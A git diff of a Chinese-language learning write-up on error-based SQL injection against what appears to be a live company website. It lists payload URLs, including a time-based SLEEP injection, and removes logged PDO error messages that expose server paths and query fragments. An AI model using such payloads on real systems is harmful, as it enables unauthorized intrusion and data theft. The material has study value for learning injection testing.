@@ -46,10 +46,6 @@ Additionally, a 403 Forbidden error was encountered while trying to use an Error
 
 6. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html'%25)` (`'%`)
 
-<!-- ```
-Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ')' AND meta_set = '1' AND meta_type = '1' AND meta_memo != ''' at line 1' in /home/lsdesign/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesign/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesign/public_html/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesign/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home/lsdesign/public_html/news_detail.php(8): require_once('/home/lsdesign/...') #4 {main} thrown in /home/lsdesign/public_html/includes/cls_mysql.php on line 44
-``` -->
-
 同 1.
 
 7. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html%25%25`
@@ -99,44 +95,21 @@ Additionally, a 404 Not Found error was encountered while trying to use an Error
 
 14. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html**/`
 
-<!-- ```html
-<script>location.href='/news.html';</script>
-``` -->
-
 同 7.
 
 15. https://www.ls-design.com.tw/news_detail_2025_zeroclick.html'/**/OR/**/SLEEP(2)--/**/123
-
-<!-- ```
-Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' AND meta_set = '1' AND meta_type = '1' AND meta_memo != ''' at line 1' in /home/lsdesign/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesign/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesign/public_html/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesign/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home/lsdesign/public_html/news_detail.php(8): require_once('/home/lsdesign/...') #4 {main} thrown in /home/lsdesign/public_html/includes/cls_mysql.php on line 44
-``` -->
 
 同 8.，並且沒有延遲 5 秒，推測 `SLEEP(5)` 沒有執行成功
 
 16. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html))`
 
-<!-- ```html
-<script>location.href='/news.html';</script>
-``` -->
-
 同 7.
 
 17. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html''`
 
-<!-- ```html
-<script>location.href='/news.html';</script>
-``` -->
-
 同 7.
 
 18. `https://www.ls-design.com.tw/123.html`
-
-<!-- ```
-Not Found
-The requested URL was not found on this server.
-
-Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.
-``` -->
 
 同 13.
 
@@ -198,4 +171,3 @@ Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[HY000]: Ge
 
 1. AI 有前面的 23 組錯誤訊息分析，很快地就在 3 次找到答案，比起我從一開始就問 AI，我自己先嘗試一下，真的卡關再問，效率會比較高，而且有比較多時間可以自主思考
 2. 我太關注原始的 SQL 語法是什麼，但實際上 Error-Based SQLi 只要能夠成功製造 SQL 的錯誤，就有機會可以偷到資料，即便不知道原始的 SQL 語法也沒關係（但我還是好想知道喔XD）
-<!-- todo-yusheng group -->
